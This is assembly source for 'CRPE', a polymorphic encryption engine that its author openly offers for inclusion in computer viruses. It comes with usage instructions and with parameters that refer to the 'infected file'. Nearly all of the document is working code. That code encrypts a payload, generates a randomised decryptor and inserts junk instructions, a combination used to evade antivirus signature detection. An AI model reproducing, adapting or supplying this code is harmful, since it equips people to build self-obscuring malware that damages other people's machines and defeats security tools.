;-------------------------------------------------------------------------------
;
;                    CRPE - cH4R_ Real Polymorphic Engine
;
;                             by cH4R_/iKX
;
;                             Version: 1.5
;
;-------------------------------------------------------------------------------
;                        http://www.charvx.cjb.net
;-------------------------------------------------------------------------------
; LICENSE: You can do ANYTHING with this code, this code have NO WARRANTLY of
; work, and the author will NOT be responsible for damages to your machine or
; any other machine. If you will use it in your virus, just give me some
; credits, and i will be happy. ;*
;-------------------------------------------------------------------------------
;
; News:
;
; - New code layout (tabs :P)
; - Some optimizations for size and speed
; - Improved morphing & trash generation
; - A lot of bugs fixed, now CRPE is completely working !! :D
;
;-------------------------------------------------------------------------------
;
; CRPE in pratice:
;
; To use it in your virus u will have to include CRPE in your
; source (duh!). Before call the engine to make a poly decryptor,
; "YOU" will have to find a place to HASH, used obtain a the
; encryption/decryption key.
; Your code must allow 586 instructions and have about 100
; bytes of stack memory for CRPE.
;
; ------> Input (in STACK):
;
; Arg1 = [POINTER TO DATA, YOU WANNA ENCRYPT]
; Arg2 = [SIZE OF DATA, YOU WANNA ENCRYPT]
; Arg3 = [BUFFER TO CRPE SAVE "CALL + ENCRYPTED DATA + DECRYPTOR"]
; Arg4 = [SIZE OF AREA TO HASH]
; Arg5 = [POINTER TO AREA THAT WE WILL HASH]
; Arg6 = [POINTER TO AREA THAT WE WILL HASH, IN INFECTED FILE]
;
; ------> Output:
;
; EAX = Size of "TRASH + CALL + ENCRYPTED DATA + DECRYPTOR"
; * ALL other register will be restored
; ** Flags will be "corrupted"
;
; ------> Example (for dummy guys):
;
; In data section:
;
; Buf db (CRPE_max_total + SIZE_OF_YOUR_CODE) dup (0)
;
; In code section:
;
; push 00401000h            ; Area to hash, in infected file
; push edx                  ; Area to hash, now
; push 00000200h            ; Size of area to hash
; push [ebp+Buf]            ; Buffer
; push CODE_SIZE            ; Size of area to encrypt
; push [ebp+CODE_BEGIN]     ; Pointer to area to encrypt
; call CRPE_make
;
; ------> The result will be something like:
;
;        [SOME TRASH INSTRUCTIONS]
;
;          [CALL POLY_DECRYPTOR]
;
;            [ENCRYPTED DATA]
;
;            [POLY_DECRYPTOR]
;
;-------------------------------------------------------------------------------


; -- User information to allocate memory --

; Max. size of decryptor in bytes
       CRPE_max_dec equ 0A3h
; Max. memory required, SizeOf( [TRASH] + CALL POLY_DECRYPTOR + POLY_DECRYPTOR )
       CRPE_max_total equ CRPE_max_dec+02Fh

; -----------------------------------------

; Things to save my time...
  ofs equ offset
  bye equ byte ptr
  dwo equ dword ptr
  wod equ word ptr

; Structure of PUSHAD
 STACK_REG STRUCT
    _EDI   dd ?
    _ESI   dd ?
    _EBP   dd ?
    _ESP   dd ?
    _EBX   dd ?
    _EDX   dd ?
    _ECX   dd ?
    _EAX   dd ?
 STACK_REG ENDS

; PUSHAD structure size
 STACK_REGS equ SIZE STACK_REG

; Structure of stack used in CRPE

; Arguments
 arg6 equ 18h
 arg5 equ 14h
 arg4 equ 10h
 arg3 equ 0Ch
 arg2 equ 08h
 arg1 equ 04h

; SizeOf( PUSHAD + TEMPORARY MEMORY )
 CRPE_stack equ CRPE_tmp+STACK_REGS

; Size of temporary memory
 CRPE_tmp equ 0Fh

; Registers
 R_EAX equ 0
 R_ECX equ 1
 R_EDX equ 2
 R_EBX equ 3
 R_ESP equ 4
 R_EBP equ 5
 R_ESI equ 6
 R_EDI equ 7

; CRPE Signature
 db "[CRPE]"

;-------------------------------------------------------------------------------
;                            Main procedure of CRPE
;-------------------------------------------------------------------------------
; Input:
; Arg1 = [POINTER TO DATA, YOU WANNA ENCRYPT]
; Arg2 = [SIZE OF DATA, YOU WANNA ENCRYPT]
; Arg3 = [BUFFER TO CRPE SAVE "TRASH + CALL + ENCRYPTED DATA + DECRYPTOR"]
; Arg4 = [SIZE OF AREA TO HASH]
; Arg5 = [POINTER TO AREA THAT WE WILL HASH, NOW]
; Arg6 = [POINTER TO AREA THAT WE WILL HASH, IN INFECTED FILE]
; Output:
; EAX = Size of result ("TRASH + CALL + ENCRYPTED DATA + DECRYPTOR") in bytes

CRPE_make       proc

             pushad               ; Save registers...

             ; Set memory

             sub      esp,CRPE_tmp              ; Reserve stack
             mov      ebp,esp                   ; EBP = Pointer to reserved stack

             mov      edi,[esp+CRPE_stack+arg3] ; EDI = Pointer to buffer

             ; Generate initial TRASH + CALL

             call     CRPE_tg                    ; Generate some trash..

             push     1                          ; We will generate more trash ?
             call     CRPE_rnd                   ;
             xchg     eax,ecx                    ; Choose: YES or NOT
             jecxz    @insert_call               ;

             call     CRPE_tg                    ; Generate more trash...

             @insert_call:
             mov      al,0E8h                    ; Generate: CALL opcode
             stosb                               ; write...
             mov      eax,edi                    ; Generate: immed32
             add      eax,[esp+CRPE_stack+arg2]  ;
             sub      eax,edi                    ;
             stosd                               ; write...

             ; Copy

             mov      ecx,[esp+CRPE_stack+arg2]     ; ECX = Size of area to encrypt
             mov      esi,[esp+CRPE_stack+arg1]     ; ESI = Pointer to area
             push     edi                           ; Save EDI !
             push     ecx                           ; Save ECX !
             cld                                    ;
             rep      movsb                         ; Copy...

             ; Hash

             mov      ebx,[esp+CRPE_stack+arg5+8]   ; EBX = Area to hash
             mov      ecx,[esp+CRPE_stack+arg4+8]   ; ECX = Size of area to hash
             push     -1                            ;
             call     CRPE_rnd                      ; EAX = Random number
             mov      [ebp+4],eax                   ; Save "MAGIC" in temporary memory

             push     eax                          ; Arg3
             push     ecx                          ; Arg2
             push     ebx                          ; Arg1
             call     CRPE_hash                    ; Hash...

             ; Encrypt

             pop      ecx                           ; Restore ECX !
             pop      edx                           ; Restore EDI in EDX !

             sub      ecx,4                         ; \ Some fixes...
             add      edx,ecx                       ; /
             @@enc_loop:
             xor      [edx],eax                     ; XOR [BUFFER], KEY
             xor      eax,ecx                       ; XOR KEY, COUNTER
             dec      edx
             dec      ecx                           ; DEC COUNTER
             jns      @@enc_loop                    ; encryption loop

             ; --- TRASH + PUSHAD ---

             push     1                           ;
             call     CRPE_rnd                    ; Choose: YES or NO
             xchg     eax,ecx                     ; Exchange: EAX <-> ECX
             jecxz    @no_trash                   ; ECX = 0 ? Dont put trash...
             call     CRPE_tg                     ; Trash gen. routine
             @no_trash:                           ;
             mov      al,60h                      ; Generate: PUSHAD
             stosb                                ; Write...

             ; --- HASH INIT ---

             ; Generate MOV (REG32_1),Buffer
             push     3                           ;
             call     CRPE_rnd                    ; Get random number between 0-3
             mov      [ebp],al                    ; Save AL in temporary memory
             or       al,0B8h                     ; AL += B8h (opcode of MOV (REG),imm32)
             stosb                                ; Write..
             mov      eax,[esp+CRPE_stack+arg6]   ; imm32 = Pointer to buffer
             stosd                                ; Write..

             ; Generate MOV (REG32_2),Size
             @rnd_1:                            ;
             push     3                         ;
             call     CRPE_rnd                  ; Get random number between 0-3
             cmp      [ebp],al                  ; AL = First value of AL ?
             jz       @rnd_1                    ; Randomize again...
             mov      [ebp+1],al                ; Save AL in temporary memory
             or       al,0B8h                   ; AL += B8h (opcode of MOV (REG),imm32)
             stosb                              ; Write..
             mov      eax,[esp+CRPE_stack+arg4] ; imm32 = Size of buffer
             stosd                              ; Write..

             ; Generate XOR/SUB (REG32_3),(REG32_3)
             @rnd_2:
             push     3                            ;
             call     CRPE_rnd                     ; Get random number between 0-3
             cmp      [ebp],al                     ; AL = First value of AL ?
             jz       @rnd_2                       ; Randomize again...
             cmp      [ebp+1],al                   ; AL = Second value of AL ?
             jz       @rnd_2                       ; Randomize again...
             mov      [ebp+2],al                   ; Save AL in temporary memory...
             mov      bl,al                        ; BL = AL      \
             shl      al,3                         ; AL = AL * 8   > Optimized for speed
             add      al,bl                        ; AL+= BL      /
             or       al,0C0h                      ; AL+= 0C0h (r32/r32)
             mov      ebx,eax                      ; EBX = EAX
             push     1                            ;
             call     CRPE_rnd                     ; Choose: SUB or XOR
             or       eax,eax                      ;
             jz       @@sub__                      ;
             @@xor__:                              ;
             mov      al,033h                      ; Generate: XOR
             jmp      @write0                      ;
             @@sub__:                              ;
             mov     al,02Bh                       ; Generate: SUB
             @write0:                              ;
             mov     ah,bl                         ;
             stosw                                 ; Write..

             ; Generate: MOV (REG32_4),(REG32_3)
             mov     al,[ebp+2]                    ; EAX = [EBP+2] (Third value of AL)
             xor     al,[ebp+1]                    ; XOR AL,[EBP+1](Second value of AL)
             xor     al,[ebp]                      ; XOR AL,[EBP]  (First value of AL)
             mov     [ebp+3],al                    ; Save AL in temporary memory
             shl     al,3                          ; AL = AL * 8
             or      al,[ebp+2]                    ; AL = AL + REG32_3
             or      al,0C0h                       ; AL+= 0C0h
             xchg    al,ah                         ; Exchange: AL <-> AH
             mov     al,08Bh                       ; AL = 08Bh  (MOV (r32),(r32) opcode)
             stosw                                 ; Write...
             mov     [ebp+0Ch],edi                 ; Save current position in temp. memory

             ; --- HASH BYTE ---

             ; Generate: XOR (REG32_3),MAGIC
             mov     [ebp+8],edi              ; Save current position in temp. memory
             mov     al,bye [ebp+2]           ; AL = REG32_3
             or      eax,eax                  ; AL != 0 ?
             jnz     @@normal_xor             ; Normal version of XOR...
             or      al,035h                  ; Optimized version for EAX
             stosb                            ; Write...
             jmp     @@immed32_of_xor         ; Jump to put an immed32
             @@normal_xor:                    ;
             or      al,0F0h                  ; AL+= 0F0h
             mov     ah,081h                  ; AH = 081h
             xchg    ah,al                    ; Exchange: AH <-> AL
             stosw                            ; Write...
             @@immed32_of_xor:                ;
             mov     eax,[ebp+4]              ; EAX = Saved "MAGIC" in temp. memory
             stosd                            ; Write...

             ; Generate: REG32_3_LO8 ^= BUF[COUNTER-1]
             mov     al,032h               ; XOR r8,mem opcode
             stosb                         ; Write...

             mov     al,bye [ebp+2]        ; AL = REG32_3
             shl     al,3                  ; AL = AL * 8
             add     al,44h                ; Identify R8,LOW of REG32_3
             stosb                         ; Write...

             mov     al,[ebp]              ; AL = REG32_1   \ Combination of registers
             shl     al,3                  ; AL = Ah * 8    / Generate: [REG32_2+REG32_1]
             add     al,[ebp+1]            ; AL+= REG32_2  /
             mov     ah,0FFh               ; Generate: -1
             stosw                         ; Write...

             ; Generate: ADD/OR (REG32_4),8
             xor     ecx,ecx               ;
             push    1                     ;
             call    CRPE_rnd              ; Choose: ADD or OR
             xchg    eax,ecx               ;
             jecxz   @add_                 ;
             mov     ah,8                  ; Generate: OR
             @add_:                        ; Generate: ADD
             mov     al,83h                ;
             or      ah,[ebp+3]            ; AH = REG32_4
             or      ah,0C0h               ;
             stosw                         ; Write...
             mov     al,8                  ;
             stosb                         ; Write...
             mov     [ebp+08h],edi         ; Save current position in temp. memory

             ; --- HASH BIT ---

             ; TRASH or not
             push    1                     ;
             call    CRPE_rnd              ; Choose: YES or NO
             xchg    eax,ecx               ; Exchange: EAX <-> ECX
             jecxz   @no_trash2            ; ECX = 0 ? So, dont put trash
             call    CRPE_tg               ; Put trash...
             @no_trash2:                   ;

             ; Generate: SHL [REG32_3],1
             mov     al,0D1h               ; SHL (REG),1  opcode
             mov     ah,[ebp+2]            ; AH = REG32_3
             or      ah,0E0h               ;
             stosw                         ; Write..

             ; Generate: SBB [REG32_3], [REG32_4]
             mov     ah,[ebp+2]                ; AH = REG32_3
             shl     ah,3                      ; AH = AH * 8
             add     ah,[ebp+3]                ; AH+= REG32_4
             add     ah,0C0h                   ;
             mov     al,01Bh                   ; AL = 01Bh (SBB opcode)
             stosw                             ; Write..

             ; Generate: DEC [REG32_4]
             mov     al,[ebp+3]                ; AL = REG32_4
             add     al,048h                   ; AL+= 048h (DEC REG opcode)
             stosb                             ; Write..

             ; Generate: JNZ hash_bit (bit loop)
             mov     eax,[ebp+08h]             ; EAX = hash_bit position
             call    CRPE_make_jnz             ; Calcule the jump...

             ; Generate: DEC [REG32_2]
             mov     al,[ebp+1]                ; AL = REG32_2
             add     al,048h                   ; AL+= 048h (DEC REG opcode)
             stosb                             ; Write..

             ; Generate: JNZ hash_byte (byte loop)
             mov     eax,[ebp+0Ch]             ; EAX = hash_bit position
             call    CRPE_make_jnz             ; Calcule the jump...

             ; --- DECRYPTOR INIT ---

             ; Generate: REG32_1 = Encrypted area
             mov     al,08Bh                   ; AL = MOV opcode
             stosb                             ; Write..

             @rnd_3:                           ; Choose another REG32_1
             push    3                         ;
             call    CRPE_rnd                  ; Get random number between 0-7
             cmp     al,[ebp+2]                ; AL = REG32_3 ?
             jz      @rnd_3                    ; So try again..
             cmp     al,4                      ; AL = ESP (4) ?
             jz      @rnd_3                    ; So try again..
             mov     [ebp],al                  ; Save in temporary memory
             shl     al,3                      ; AL = AL * 8
             add     al,044h                   ; AL+= 44h
             stosb                             ; Write..

             mov     ax,2024h                  ; AX = 2024h (ESP+20h)
             stosw                             ; Write..

             ; Generate: REG32_2 = Size of area - 4
             @rnd_4:                           ; Choose another REG32_2
             push    7                         ;
             call    CRPE_rnd                  ; Get random number between 0-7
             cmp     al,[ebp+2]                ; AL = REG32_3 ?
             jz      @rnd_4                    ; So try again..
             cmp     al,[ebp]                  ; AL = REG32_1 ?
             jz      @rnd_4                    ; So try again..
             cmp     al,4                      ; AL = ESP (4) ?
             jz      @rnd_4                    ; So try again..
             mov     [ebp+1],al                ; Save in temporary memory
             add     al,0B8h                   ; AL+= B8h (MOV opcode)
             stosb                             ; Write..

             mov     eax,[esp+CRPE_stack+arg2] ; EAX = immed32
             sub     eax,4                     ; EAX-= 4
             stosd                             ; Write..

             ; Generate: ADD [REG32_1] , [REG32_2]

             mov     ax,0C003h                 ; AX = ADD REG,REG opcode
             mov     bl,[ebp]                  ; AL = REG32_1
             shl     bl,3                      ; Second reg..
             or      bl,[ebp+1]                ; REG32_2, first reg..
             or      ah,bl                     ;
             stosw                             ; Write..

             ; --- DECRYPTOR LOOP ---

             mov     [ebp+04],edi              ; Save current position in temporary mem.

             ; Generate: XOR [REG32_1],[REG32_3]
             mov     al,031h                   ; XOR [DS:REG],REG opcode
             mov     ah,[ebp+2]                ; REG32_2
             shl     ah,3                      ; First reg
             add     ah,[ebp]                  ; REG32_2, second reg
             stosw                             ; Write..

             ; Generate: XOR [REG32_3],[REG32_2]
             mov     ah,[ebp+2]                ; AH = REG32_3
             shl     ah,3                      ; AH = AH * 8
             add     ah,0C0h                   ; AH+= C0h
             or      ah,[ebp+1]                ; AH+= REG32_2
             mov     al,033h                   ; AL = 33h (XOR opcode)
             stosw                             ; Write..

             ; Generate some trash or not
             push    1                         ;
             call    CRPE_rnd                  ; Choose: YES or NO
             xchg    eax,ecx                   ;
             jecxz   @no_trash3                ;
             call    CRPE_tg                   ;
             @no_trash3:

             ; Generate: DEC [REG32_1]         ;
             mov     al,[ebp]                  ; REG32_1
             add     al,048h                   ;
             stosb                             ; write..

             ; Generate: DEC [REG32_2]
             mov     al,[ebp+1]                ; REG32_2
             add     al,048h                   ;
             stosb                             ; write..

             ; Generate: JNS DECRYPTOR_LOOP
             mov     eax,[ebp+4]               ; EAX = DECRYPTOR_LOOP position
             call    CRPE_make_jnz             ; Calculate jump
             mov     bye [edi-2],079h          ; JNS

             ; --- TRASH + POPAD ---

             ; TRASH or not                    ;
             push    1                         ;
             call    CRPE_rnd                  ; Choose: YES or NO
             xchg    eax,ecx                   ;
             jecxz   @no_trash4                ;
             call    CRPE_tg                   ;
             @no_trash4:                       ;

             ; Generate: POPAD
             mov     al,061h                   ; AL = POPAD opcode
             stosb                             ; Write..

             ; --- TRASH + RET ---

             ; TRASH or not
             push    1                         ;
             call    CRPE_rnd                  ; Choose: YES or NO
             xchg    eax,ecx                   ; Exchange: EAX <-> ECX
             jecxz   @no_trash5                ; ECX = 0 ? So, dont put trash
             call    CRPE_tg                   ; Put trash...
             @no_trash5:                       ;

             ; Generate: RET                   ;
             mov     al,0C3h                   ; AL = 0C3h (RET opcode)
             stosb                             ; Write...

             ; Calculate return value & Unset memory & Restores regs & Return
             mov     eax,[esp+CRPE_stack+arg3] ; EAX = Initial buffer
             sub     edi,eax
             mov     [esp+CRPE_tmp+STACK_REG._EAX],edi
             add     esp,CRPE_tmp
             popad
             ret     18h

             ; Common rotine to calculate SHORT jnz's
             CRPE_make_jnz:
             inc     edi                           ;
             inc     edi                           ;
             sub     eax,edi                       ; EAX-= Current position
             mov     ah,075h                       ; AH = 75h (JNZ opcode)
             xchg    ah,al                         ; Exchange: AH <-> AL
             mov     [edi-2],ax                    ; Write..
             ret                                   ; Return..

CRPE_make       endp

;-------------------------------------------------------------------------------
;                 INTERNAL FUNCTIONS, DONT WORRY ABOUT IT ;)
;-------------------------------------------------------------------------------

; - Random number generator beetween 0-[Arg1]
; Input: Arg1 = Range
; Output: EAX = Random number

CRPE_rnd      proc

            pushad             ; Save registers..

            rdtsc              ; CPU TIME-STAMP in EDX:EAX
            xor     edx,esp    ;
            xor     eax,edx    ;

            mov     ecx,[esp+STACK_REGS+4] ; ECX = Arg1
            inc     ecx                    ;
            jecxz   CRPE_rnd_fim           ;

            xor     edx,edx    ; EDX = 0
            div     ecx        ; EAX = EAX / Arg1
            mov     eax,edx    ; EAX = Rest

            CRPE_rnd_fim:
            mov     [esp+STACK_REG._EAX],eax

            popad               ; Restore registers..
            ret      4h         ; Return..

CRPE_rnd      endp

; - Trash generator (max.: 21 bytes | min.: 2 bytes)
; Input: EDI = Buffer
; Output: EDI = Buffer (updated)

CRPE_tg       proc

            pushad      ; Save registers

            push     3                     ;
            call     CRPE_rnd              ; Get random number between 0-3

            dec      eax                   ;
            js       @trash1               ;
            dec      eax                   ;
            jz       @trash2               ;
            dec      eax                   ;
            jz       @trash3               ;

            ; Generate: PUSH (REG Y) / POP (REG Y)
            @trash4:
            push     7                  ;
            call     CRPE_rnd           ; Get random number between 0-7
            add      al,50h             ; Generate PUSH (REG)
            mov      ah,al              ;
            add      ah,8               ; Generate POP (REG)
            stosw                       ; write..

            push     1                  ; Choose next trash routine...
            call     CRPE_rnd           ;
            xchg     eax,ecx            ;
            jecxz    @trash2            ;

            ; Generate: MOV (REG X),(REG X)
            @trash3:
            push     7                  ;
            call     CRPE_rnd           ; Get random number between 0-7
            mov      bl,al              ; BL = AL      \
            shl      al,3               ; AL = AL * 8   > Optimized for speed
            add      al,bl              ; AL+= BL      /
            add      al,0C0h            ; AL+= 0C0h
            mov      ah,08Bh            ; Generater MOV (REG X),(REG X)
            xchg     ah,al              ; Exchange: AH <-> AL
            stosw                       ; write...

            push     1                  ; Choose next trash routine...
            call     CRPE_rnd           ;
            xchg     eax,ecx            ;
            jecxz    @trash1            ;

            ; Generate: CMP/TEST (REG X),(REG Y)
            @trash2:
            push     03Fh               ;
            call     CRPE_rnd           ; Get random number between 0-63
            xchg     bl,al              ; Exchange: BL <-> AL
            add      bl,0C0h            ; BL+= 0C0h
            push     1                  ;
            call     CRPE_rnd           ; Choose: CMP or TEST
            or       eax,eax            ;
            jz       @@_cmp             ;
            @@_test:                    ;
            mov      al,085h            ; Generate: TEST opcode
            jmp      @@write_trash_     ;
            @@_cmp:                     ;
            mov      al,03Bh            ; Generate: CMP opcode
            @@write_trash_:             ;
            mov      ah,bl              ; AH = BL
            stosw                       ; Write...
            jmp      @trash_end

            ; Generate: CALL (XXXX) | ESP-4
            @trash1:
            mov      al,0E8h            ;
            stosb                       ; Generate CALL opcode

            push     8                  ;
            call     CRPE_rnd           ; Get random number between 0-8
            inc      eax                ; EAX++
            stosd                       ; Generate imm32 of CALL

            mov      ecx,eax            ; ECX = EAX (imm32)
            @@repeat_trash:             ;
            push     -1                 ;
            call     CRPE_rnd           ; Generate random number in EAX
            stosb                       ; write al
            loop     @@repeat_trash     ; (ECX) times...

            push     1                  ;
            call     CRPE_rnd           ; Choose: ADD ESP,4 or
            xchg     eax,ecx            ; INC ESP / INC ESP / INC ESP / INC ESP
            jecxz    @@4dec_esp         ;

            mov      al,83h             ;
            stosb                       ; Generate ADD ESP,4
            mov      ax,04C4h           ;
            stosw                       ;
            jmp      @trash_end         ; No more trash...

            @@4dec_esp:                 ;
            mov      eax,44444444h      ; Generate INC ESP, 4 times
            stosd                       ;

            @trash_end:
            mov      [esp+STACK_REG._EDI],edi ; Update EDI...
            popad       ; Restore registers
            ret         ; Return...

CRPE_tg       endp

; - Hashing
; Input:
; Arg1 = Pointer to data to hash
; Arg2 = Size of data to hash
; Arg3 = MAGIC
; Outrput:
; EAX = Hashed data

CRPE_hash       proc

            pushad                             ; Save regs.

            mov      edx,[esp+STACK_REGS+4]    ; EDX = Buffer
            mov      ecx,[esp+STACK_REGS+8]    ; ECX = Size of buffer (byte counter)
            xor      eax,eax                   ; EAX = 0 (reader / hasher)
            mov      ebx,eax                   ; EBX = 0 (bit counter)

            @@@hash_byte:                      ;
            xor      eax,[esp+STACK_REGS+12]   ;
            xor      al,[edx+ecx-1]            ;
            or       bl,8                      ;

            @@@hash_bit:                       ;
            shl      eax,1                     ;
            sbb      eax,ebx                   ;
            dec      ebx                       ;
            jnz      @@@hash_bit               ; EBX != 0 ? Go to the next bit...

            dec      ecx                       ;
            jnz      @@@hash_byte              ; ECX != 0 ? Go to the next byte...

            mov      [esp+STACK_REG._EAX],eax  ;

            popad                              ; Restore regs.
            ret      0Ch                       ; Return...

CRPE_hash       endp







